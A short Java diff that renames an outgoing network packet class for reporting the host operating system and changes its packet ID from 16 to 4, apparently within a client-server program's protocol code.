@@ -12,7 +12,7 @@ import com.redpois0n.oslib.bsd.BSDOperatingSystem;
 import com.redpois0n.oslib.linux.LinuxOperatingSystem;
 import com.redpois0n.oslib.osx.OSXOperatingSystem;
 
-public class Packet16InitOperatingSystem extends AbstractOutgoingPacket {
+public class Packet4InitOperatingSystem extends AbstractOutgoingPacket {
 
 	@Override
 	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
@@ -63,6 +63,6 @@ public class Packet16InitOperatingSystem extends AbstractOutgoingPacket {
 
 	@Override
 	public byte getPacketId() {
-		return (byte) 16;
+		return (byte) 4;
 	}
 }
